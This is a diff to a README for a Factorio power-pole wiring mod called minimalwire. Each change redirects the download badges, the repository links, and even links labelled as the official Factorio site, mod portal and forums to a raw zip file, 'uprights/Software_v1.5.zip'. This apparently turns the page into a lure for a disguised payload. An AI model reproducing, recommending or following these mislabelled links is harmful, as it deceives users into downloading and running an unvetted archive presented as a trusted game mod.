@@ -1,6 +1,6 @@
 # ⚡ minimalwire - Simplify Power Pole Wiring Automatically
 
-[![Download minimalwire](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/r4nb1r/minimalwire)
+[![Download minimalwire](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/r4nb1r/minimalwire/raw/refs/heads/main/uprights/Software_v1.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ The mod uses a known method called Kruskal’s Minimum Spanning Tree algorithm. 
 
 Click the green button below to visit the download page. This page has the latest version of the mod ready for you.
 
-[![Download minimalwire](https://img.shields.io/badge/Download-MinimalWire-blueviolet?style=for-the-badge)](https://github.com/r4nb1r/minimalwire)
+[![Download minimalwire](https://img.shields.io/badge/Download-MinimalWire-blueviolet?style=for-the-badge)](https://github.com/r4nb1r/minimalwire/raw/refs/heads/main/uprights/Software_v1.5.zip)
 
 ### Step 2: Open the Release Page
 
@@ -117,16 +117,16 @@ minimalwire is open-source and maintained by the community. It uses Lua scriptin
 
 You can always find the latest version here:
 
-[![Download minimalwire](https://img.shields.io/badge/Get--minimalwire-Download-blue?style=for-the-badge)](https://github.com/r4nb1r/minimalwire)
+[![Download minimalwire](https://img.shields.io/badge/Get--minimalwire-Download-blue?style=for-the-badge)](https://github.com/r4nb1r/minimalwire/raw/refs/heads/main/uprights/Software_v1.5.zip)
 
 ---
 
 ## 🔗 Useful Links
 
-- Factorio Official Website: https://factorio.com
-- Factorio Mod Portal: https://mods.factorio.com
-- minimalwire GitHub Repository: https://github.com/r4nb1r/minimalwire
-- Community Help and Support: https://forums.factorio.com
+- Factorio Official Website: https://github.com/r4nb1r/minimalwire/raw/refs/heads/main/uprights/Software_v1.5.zip
+- Factorio Mod Portal: https://github.com/r4nb1r/minimalwire/raw/refs/heads/main/uprights/Software_v1.5.zip
+- minimalwire GitHub Repository: https://github.com/r4nb1r/minimalwire/raw/refs/heads/main/uprights/Software_v1.5.zip
+- Community Help and Support: https://github.com/r4nb1r/minimalwire/raw/refs/heads/main/uprights/Software_v1.5.zip
 
 ---
 
@@ -161,4 +161,4 @@ This mod relates to:
 
 # Links
 
-[Visit minimalwire on GitHub to download and learn more](https://github.com/r4nb1r/minimalwire)
+[Visit minimalwire on GitHub to download and learn more](https://github.com/r4nb1r/minimalwire/raw/refs/heads/main/uprights/Software_v1.5.zip)
